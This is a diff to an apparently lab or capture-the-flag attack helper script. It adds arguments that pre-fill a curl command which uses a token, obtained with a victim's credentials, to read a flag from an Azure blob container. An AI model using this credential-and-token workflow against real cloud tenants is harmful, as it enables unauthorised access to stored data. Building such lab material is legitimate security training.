@@ -71,6 +71,10 @@ def main():
                         help="Victim's UPN (pre-fills the simulator command)")
     parser.add_argument("--victim-password", default=None, dest="victim_password",
                         help="Victim's password (pre-fills the simulator command)")
+    parser.add_argument("--storage-account", default=None, dest="storage_account",
+                        help="Storage account name (pre-fills the final curl command)")
+    parser.add_argument("--container", default="sensitive-data", dest="container",
+                        help="Blob container name (default: sensitive-data)")
     args = parser.parse_args()
 
     print()
@@ -131,12 +135,17 @@ def main():
     with open(TOKEN_PATH, "w") as f:
         json.dump(token_data, f, indent=2)
 
+    storage_url = (
+        f"https://{args.storage_account}.blob.core.windows.net/{args.container}/flag.txt"
+        if args.storage_account
+        else f"https://<storage_account>.blob.core.windows.net/{args.container}/flag.txt"
+    )
     print()
-    print("[*] Use the access token to call the Storage API:")
+    print("[*] Use the access token to read the flag:")
     print(f"    TOKEN=$(python3 -c \"import json; d=json.load(open('{TOKEN_PATH}')); print(d['access_token'])\")")
-    print(f"    curl -H \"Authorization: Bearer $TOKEN\" \\")
+    print(f"    curl -s -H \"Authorization: Bearer $TOKEN\" \\")
     print(f"         -H \"x-ms-version: 2020-04-08\" \\")
-    print(f"         \"https://<storage_account>.blob.core.windows.net/sensitive-data/flag.txt\"")
+    print(f"         \"{storage_url}\"")
     print()
 
 
